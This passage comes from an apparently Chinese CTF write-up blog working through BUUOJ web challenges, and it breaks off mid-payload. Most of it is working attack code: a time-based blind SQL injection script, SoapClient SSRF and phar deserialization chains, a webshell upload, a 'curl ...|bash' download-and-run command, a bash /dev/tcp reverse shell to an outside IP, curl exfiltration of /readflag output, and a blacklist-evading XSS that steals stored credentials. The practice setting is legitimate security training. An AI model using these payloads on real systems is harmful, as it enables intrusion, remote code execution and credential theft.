&#39;(&#39;.preg_replace(&#39;&#x2F;&#96;([^&#96;,]+)&#96;&#x2F;&#39;,&#39;\&#39;$&#123;1&#125;\&#39;&#39;,$this-&gt;get_column($values)).&#39;)&#39;;</span><br><span class="line">        $nid &#x3D;</span><br><span class="line">        $sql &#x3D; &#39;insert into &#39;.$table.&#39;(&#39;.$column.&#39;) values &#39;.$value;</span><br><span class="line">        $result &#x3D; $this-&gt;conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        return $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进Db::get_column()方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private function get_column($columns)&#123;</span><br><span class="line">        if(is_array($columns))</span><br><span class="line">            $column &#x3D; &#39; &#96;&#39;.implode(&#39;&#96;,&#96;&#39;,$columns).&#39;&#96; &#39;;</span><br><span class="line">        else</span><br><span class="line">            $column &#x3D; &#39; &#96;&#39;.$columns.&#39;&#96; &#39;;</span><br><span class="line">        return $column;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>会以`,`为连接符操作数组，并在两端加上`符号，相当于先将<code>$value</code>数组的每个值用反引号引起来，然后再用逗号连接起来，变成这样的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;$value[0]&#96;,&#96;$value[1]&#96;，&#96;$value[1]&#96;</span><br></pre></td></tr></table></figure><p>接着经过这个正则替换之后将匹配字符串中所有反引号之间的内容，将其取出放到两个单引号里面，然后放入insert语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &#39;insert into &#39;.$table.&#39;(&#39;.$column.&#39;) values &#39;.$value;</span><br></pre></td></tr></table></figure><p>如果<code>$value</code>元素本身带有反引号，就会破坏掉拼接的结构，在做反引号变为单引号的时候造成问题，比如说:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">考虑$value为 : array(&quot;admin&#96;,&#96;1&#96;)#&quot;,&quot;password&quot;)</span><br><span class="line">经过处理后，就变为了 : (&#39;admin&#39;,&#39;1&#39;)#&#96;,&#39;password&#39; )</span><br><span class="line">相当于闭合了单引号，造成注入。</span><br></pre></td></tr></table></figure><p>本地可以测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$columns &#x3D; array(&#39;a&#39;,&#39;b&#39;,&#39;c&#96;,sql)#&#39;,&#39;d&#39;);</span><br><span class="line">if(is_array($columns))</span><br><span class="line">    $column &#x3D; &#39; &#96;&#39;.implode(&#39;&#96;,&#96;&#39;,$columns).&#39;&#96; &#39;;</span><br><span class="line">else</span><br><span class="line">    $column &#x3D; &#39; &#96;&#39;.$columns.&#39;&#96; &#39;;</span><br><span class="line"></span><br><span class="line">echo $column.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &#39;(&#39;.preg_replace(&#39;&#x2F;&#96;([^&#96;,]+)&#96;&#x2F;&#39;,&#39;\&#39;$&#123;1&#125;\&#39;&#39;,$column).&#39;)&#39;;</span><br><span class="line">&#x2F;&#x2F;output</span><br><span class="line">&#96;a&#96;,&#96;b&#96;,&#96;c&#96;,sql)#&#96;,&#96;d&#96;</span><br><span class="line">( &#39;a&#39;,&#39;b&#39;,&#39;c&#39;,sql)#&#96;,&#39;d&#39; )</span><br></pre></td></tr></table></figure><p>获取admin密码脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;cfa4fe25-3f41-4b51-94cc-ffb813030907.node3.buuoj.cn&#x2F;index.php?action&#x3D;publish&#39;</span><br><span class="line">cookies &#x3D; &#123;</span><br><span class="line">    &quot;PHPSESSID&quot;: &quot;609p5gi14cubaulus8h2vh3rj1&quot;   #先登陆，然后换cookie</span><br><span class="line">&#125;</span><br><span class="line">text&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    l&#x3D;28</span><br><span class="line">    h&#x3D;126</span><br><span class="line">    while abs(h - l) &gt; 1:</span><br><span class="line">        mid&#x3D;(l+h)&#x2F;2</span><br><span class="line">        payload&#x3D;&#39;c&#96;,if(((ascii(mid((select password from ctf_users limit 1),&#123;&#125;,1)))&gt;&#123;&#125;),sleep(3),1))#&#39;</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &#39;signature&#39;:payload.format(i,mid),</span><br><span class="line">            &#39;mood&#39;:0</span><br><span class="line">        &#125;</span><br><span class="line">        now_t&#x3D;time.time()</span><br><span class="line">        re&#x3D;requests.post(url,data&#x3D;data,cookies&#x3D;cookies)</span><br><span class="line">        #print(re.text)</span><br><span class="line">        if time.time()-now_t &gt; 3:</span><br><span class="line">            l&#x3D;mid</span><br><span class="line">        else:</span><br><span class="line">            h&#x3D;mid</span><br><span class="line">    mid_num &#x3D; int((l+h+1) &#x2F; 2)</span><br><span class="line">    text +&#x3D; chr(int(h))</span><br><span class="line">    print(text)</span><br></pre></td></tr></table></figure><ol start="3"><li>得到MD5:c991707fdf339958eded91331fb11ba0,解得jaivypassword，尝试进行登录发现页面回显<code>You can only login at the usual address</code>，在源代码包全局搜索这一字符串，在user.php处找到</li></ol><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327104310957.png" alt></p><p>分析代码可知$user的值来源于$ret</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$ret &#x3D; $db-&gt;select(array(&#39;id&#39;,&#39;username&#39;,&#39;ip&#39;,&#39;is_admin&#39;,&#39;allow_diff_ip&#39;),&#39;ctf_users&#39;,&quot;username &#x3D; &#39;$username&#39; and password &#x3D; &#39;$password&#39; limit 1&quot;);</span><br></pre></td></tr></table></figure><p>get_ip是由$_SERVER[’‘REMOTE_ADDR’]获得的，需要ssrf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function get_ip()&#123;</span><br><span class="line">    return $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在use.php的showmess方法中找到反序列化函数</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327222624765.png" alt></p><p>这里的row[2]，为上面select查询中的mood字段值。SSRF+反序列化，SSRF可用使用内置类Soapclient，并且下面还调用了一个getcountry的自定义方法，正好可用触发Soapclient::__call进行网络请求</p><p>新建一个窗口,替换payload中的cookie和爆破后的code</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328000047237.png" alt></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?action&#x3D;login&quot;;</span><br><span class="line">$post_string &#x3D; &#39;username&#x3D;admin&amp;password&#x3D;jaivypassword&amp;code&#x3D;113713&#39;;&#x2F;&#x2F;换code</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;Cookie: PHPSESSID&#x3D;u1umj91lggqgj0ccibd81h3d91&#39;,&#x2F;&#x2F;换cookie</span><br><span class="line">);</span><br><span class="line">$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;w4nder^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string.&#39;^^&#39;,&#39;uri&#39;&#x3D;&gt;&#39;hello&#39;));</span><br><span class="line">$aaa &#x3D; serialize($b);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);</span><br><span class="line">echo &#39;0x&#39;.bin2hex($aaa);</span><br></pre></td></tr></table></figure><p>运行一下得到序列化的hex值，在之前登陆的test123账号上注入mood的值</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328000906716.png" alt></p><p>用test123账号账号刷新一下<code>?action=index</code>的页面，触发发序列化，然后刷新新开的窗口页面发现publish变成了文件上传页面，这里我们之所以反序列化soap类后能登录admin，是因为</p><pre><code>$mood = unserialize($row[2]);$country = $mood-&gt;getcountry();</code></pre><p>我们知道此时$mood就是一个soap类，所以这个类没有getcountry()方法，此时就会触发soap类的__call()魔法函数就能实现登录<br>上传一个小马，连接蚁剑，查看/etc/host，发现存在173.208.161.0/24的网段，逐个curl 扫描，发现173.208.161.10存活</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89%5Cimage-20200328002224576.png" alt></p><p>在burp中查看源代码进行分析</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328002753590.png" alt></p><p>由于end会输出输入的最后一项值，如果$ext==$filename[count($filename) - 1]，die()，$filename可以直接传入，因此我们可以传个file[0]与file[1]，问题在于end()，end()返回数组最后一个元素，但并不是按照数组索引的顺序排列的，而是按照赋值顺序。也就是说我们传入file[1]=aaa,file[0]=bbb，文件名为bbb.aaa，end()返回的是bbb，第一个die就可以绕过了。</p><p><img src="https://img-blog.csdnimg.cn/20200306171314880.png" alt></p><p>上传源代码，用postman发包</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328011427281.png" alt></p><p>用code功能转换成php_cURL代码，修改url和请求体</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328012415117.png" alt></p><p>生成最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$curl &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt_array($curl, array(</span><br><span class="line">  CURLOPT_URL &#x3D;&gt; &quot;http:&#x2F;&#x2F;173.184.57.10&quot;,</span><br><span class="line">  CURLOPT_RETURNTRANSFER &#x3D;&gt; true,</span><br><span class="line">  CURLOPT_ENCODING &#x3D;&gt; &quot;&quot;,</span><br><span class="line">  CURLOPT_MAXREDIRS &#x3D;&gt; 10,</span><br><span class="line">  CURLOPT_TIMEOUT &#x3D;&gt; 30,</span><br><span class="line">  CURLOPT_HTTP_VERSION &#x3D;&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST &#x3D;&gt; &quot;POST&quot;,</span><br><span class="line">  CURLOPT_POSTFIELDS &#x3D;&gt; &quot;------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file\&quot;; filename&#x3D;\&quot;shell.php\&quot;\r\nContent-Type: false\r\n\r\n@&lt;?php system(&#39;cat &#x2F;etc&#x2F;flag*&#39;);\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;hello\&quot;\r\n\r\nshell.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file[2]\&quot;\r\n\r\n222\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file[1]\&quot;\r\n\r\n111\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file[0]\&quot;\r\n\r\n&#x2F;..&#x2F;shell.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--&quot;,</span><br><span class="line">  CURLOPT_HTTPHEADER &#x3D;&gt; array(</span><br><span class="line">    &quot;cache-control: no-cache&quot;,</span><br><span class="line">    &quot;content-type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary7MA4YWxkTrZu0gW&quot;,</span><br><span class="line">    &quot;postman-token: 09101c1a-04aa-7288-15ea-515cbc9c512b&quot;</span><br><span class="line">  ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$response &#x3D; curl_exec($curl);</span><br><span class="line">$err &#x3D; curl_error($curl);</span><br><span class="line"></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line">if ($err) &#123;</span><br><span class="line">  echo &quot;cURL Error #:&quot; . $err;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传访问得到flag：</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328012625101.png" alt></p><p>最后吐槽一下容器经常会注册失败，需要销毁重启QAQ</p><p>参考链接：</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/104687766" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104687766</a></p><p><a href="https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/ShellShellShell/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/ShellShellShell/README_zh.md</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104132751?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104132751?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p></blockquote><h3 id="0x-03-SUCTF-2019-Upload-Labs-2"><a href="#0x-03-SUCTF-2019-Upload-Labs-2" class="headerlink" title="0x 03 [SUCTF 2019]Upload Labs 2"></a>0x 03 [SUCTF 2019]Upload Labs 2</h3><ul><li><p>考点</p><p>phar反序列化、SSRF</p></li><li><p>解题过程</p></li></ul><ol><li><p>首先根据题目提供的源代码进行审计，发现要获得flag必须本地访问admin.php，这里需要进行SSRF，这里将传递到admin.php的参数进行实例化了AD类，在这个类中，又通过反射类来实例一个对象，并通过该实例化的对象来调用反射出来的该类的方法</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328115740615.png" alt></p><p>分析index.php代码发现它对上传的文件进行检查，检查图片的后缀和上传的内容中不能有<code>&lt;?</code>，这里我们可以用<code>&lt;script language=&#39;php&#39;&gt;</code>绕过。</p></li><li><p>分析func.php中的代码，对post请求的url参数进行匹配</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#39;&#x2F;^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*&#x2F;i&#39;,$_POST[&#39;url&#39;]))&#123;</span><br><span class="line">        die(&quot;Go away!&quot;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/index.png" alt></p><p>这里过滤了过滤了类似<code>phar</code>之类的伪协议，但是可以通过 php://filter 来绕过一些开头限制进行 phar 反序列化。</p><p>这里会对上传的文件进行检查，返回文件类型，可能存在phar反序列化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_path &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">$file &#x3D; new File($file_path);</span><br><span class="line">$file-&gt;getMIME();</span><br><span class="line">echo &quot;&lt;p&gt;Your file type is &#39;$file&#39; &lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure><p>跟进File类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class File&#123;</span><br><span class="line">...</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        &#x2F;&#x2F;调用反射创建类</span><br><span class="line">        $class &#x3D; new ReflectionClass($this-&gt;func);</span><br><span class="line">        &#x2F;&#x2F;创建实例</span><br><span class="line">        $a &#x3D; $class-&gt;newInstanceArgs($this-&gt;file_name);</span><br><span class="line">         &#x2F;&#x2F;触发SoapClient类的__call方法</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getMIME()&#123;</span><br><span class="line">        $finfo &#x3D; finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $this-&gt;type &#x3D; finfo_file($finfo, $this-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这里<code>$hits-&gt;func</code>可以被我们控制为<code>SoapClient</code>类，然后控制<code>$htis-&gt;file_name</code>去传入我们想要的参数。最后通过<code>$a-&gt;check();</code>调用<code>SoapClient::__call()</code>从而触发<code>SSRF</code></p><ol start="3"><li>构造payload如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    public $file_name &#x3D; &quot;&quot;;</span><br><span class="line">    public $func &#x3D; &quot;SoapClient&quot;;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php&quot;;</span><br><span class="line">        &#x2F;&#x2F;需要更改其中curl 的ip</span><br><span class="line">        $post_string &#x3D; &#39;admin&#x3D;&amp;cmd&#x3D;curl 174.1.145.112&#x2F;index.php|bash&amp;clazz&#x3D;SplStack&amp;func1&#x3D;push&amp;func2&#x3D;push&amp;func3&#x3D;push&amp;arg1&#x3D;1111&amp;arg2&#x3D;1111&amp;arg3&#x3D;&#39; . &quot;\r\n&quot;;</span><br><span class="line">        $headers &#x3D; [];</span><br><span class="line">        $this-&gt;file_name &#x3D; [</span><br><span class="line">            null,</span><br><span class="line">            array(&#39;location&#39; &#x3D;&gt; $target,</span><br><span class="line">                &#39;user_agent&#39; &#x3D;&gt; str_replace(&#39;^^&#39;, &quot;\r\n&quot;, &#39;xxxxx^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39; . join(&#39;^^&#39;, $headers) . &#39;Content-Length: &#39; . (string)strlen($post_string) . &#39;^^^^&#39; . $post_string),</span><br><span class="line">                &#39;uri&#39; &#x3D;&gt; &#39;hello&#39;)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&#39;test.phar&#39;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);</span><br><span class="line">$phar-&gt;setStub(&#39;&lt;script language&#x3D;&quot;php&quot;&gt;__HALT_COMPILER();&lt;&#x2F;script&gt;&#39;);</span><br><span class="line">$object &#x3D; new File;</span><br><span class="line">echo urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(&#39;test.phar&#39;,&#39;lanxiaojun.jpg&#39;);</span><br></pre></td></tr></table></figure><p>运行生成了一个lanxiaojun.jpg文件并上传</p><p>是的</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328113640002.png" alt></p><p>在linux下靶机的在<code>var/www/html/index.php</code>中写入弹shell的一句话，并开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.145.112&#x2F;9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在func.php页面触发反序列化</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328120255257.png" alt></p><p>然后在靶机上收到反弹的shell获得flag。</p><p>除了可以反弹shell之外还可以发包带上请求的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$post_string &#x3D; &#39;admin&#x3D;1&amp;cmd&#x3D;curl --referer &quot;&#96;&#x2F;readflag&#96;&quot; &quot;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api%26id&#x3D;72Jvrh&quot;&amp;clazz&#x3D;SplStack&amp;func1&#x3D;push&amp;func2&#x3D;push&amp;func3&#x3D;push&amp;arg1&#x3D;123456&amp;arg2&#x3D;123456&amp;arg3&#x3D;&#39;. &quot;\r\n&quot;;</span><br></pre></td></tr></table></figure><p>参考链接：</p><blockquote><p><a href="http://github.mrkaixin.computer/2020/03/16/BUU(三)/" target="_blank" rel="noopener">http://github.mrkaixin.computer/2020/03/16/BUU(%E4%B8%89)/</a></p><p><a href="https://www.jianshu.com/p/b97080cd7623" target="_blank" rel="noopener">https://www.jianshu.com/p/b97080cd7623</a></p></blockquote><h3 id="0x-04-GWCTF-2019-mypassword"><a href="#0x-04-GWCTF-2019-mypassword" class="headerlink" title="0x 04 [GWCTF 2019]mypassword"></a>0x 04 [GWCTF 2019]mypassword</h3><ul><li><p>考点</p><p>xss</p></li><li><p>解题过程</p></li></ul><ol><li>注册登录之后在feedback`页面看到了一个大大的输入框，查看源码如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(is_array($feedback))&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&#39;反馈不合法&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist &#x3D;[&#39;_&#39;,&#39;\&#39;&#39;,&#39;&amp;&#39;,&#39;\\&#39;,&#39;#&#39;,&#39;%&#39;,&#39;input&#39;,&#39;script&#39;,&#39;iframe&#39;,&#39;host&#39;,&#39;onload&#39;,&#39;onerror&#39;,&#39;srcdoc&#39;,&#39;location&#39;,&#39;svg&#39;,&#39;form&#39;,&#39;img&#39;,&#39;src&#39;,&#39;getElement&#39;,&#39;document&#39;,&#39;cookie&#39;];</span><br><span class="line">foreach ($blacklist as $val) &#123;</span><br><span class="line">while(true)&#123;</span><br><span class="line">if(stripos($feedback,$val) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">    $feedback &#x3D; str_ireplace($val,&quot;&quot;,$feedback);</span><br><span class="line">&#125;</span><br><span class="line">        else&#123;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题存在<code>CSP</code>，不能注入外部的JS，那肯定就需要在内部JS上动手脚，逐个页面看源码，结果在登陆页面看到存在<code>login.js</code>，源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (document.cookie &amp;&amp; document.cookie !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">var cookies &#x3D; document.cookie.split(&#39;; &#39;);</span><br><span class="line">var cookie &#x3D; &#123;&#125;;</span><br><span class="line">for (var i &#x3D; 0; i &lt; cookies.length; i++) &#123;</span><br><span class="line">var arr &#x3D; cookies[i].split(&#39;&#x3D;&#39;);</span><br><span class="line">var key &#x3D; arr[0];</span><br><span class="line">cookie[key] &#x3D; arr[1];</span><br><span class="line">&#125;</span><br><span class="line">if(typeof(cookie[&#39;user&#39;]) !&#x3D; &quot;undefined&quot; &amp;&amp; typeof(cookie[&#39;psw&#39;]) !&#x3D; &quot;undefined&quot;)&#123;</span><br><span class="line">document.getElementsByName(&quot;username&quot;)[0].value &#x3D; cookie[&#39;user&#39;];</span><br><span class="line">document.getElementsByName(&quot;password&quot;)[0].value &#x3D; cookie[&#39;psw&#39;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里记住密码功能会从<code>Cookie</code>中取出用户名和密码并赋值给<code>username</code>和<code>password</code>，因此我们可以利用这个内部JS来构造payload进行XSS，这里我们可以用BUU的<a href="http://http.requestbin.buuoj.cn/" target="_blank" rel="noopener">requestbin</a>来接受反馈。（RequestBin提供了一个URL，该URL将收集对其发出的请求）</p><p>在<code>feedback</code>页面构造如下payload提交：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;inpcookieut type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;&#x2F;inpcookieut&gt;</span><br><span class="line">&lt;inpcookieut type&#x3D;&quot;text&quot; name&#x3D;&quot;password&quot;&gt;&lt;&#x2F;inpcookieut&gt;</span><br><span class="line">&lt;scricookiept scookierc&#x3D;&quot;.&#x2F;js&#x2F;login.js&quot;&gt;&lt;&#x2F;scricookiept&gt;</span><br><span class="line">&lt;scricookiept&gt;</span><br><span class="line">var uname &#x3D; documcookieent.getElemcookieentsByName(&quot;username&quot;)[0].value;</span><br><span class="line">var passwd &#x3D; 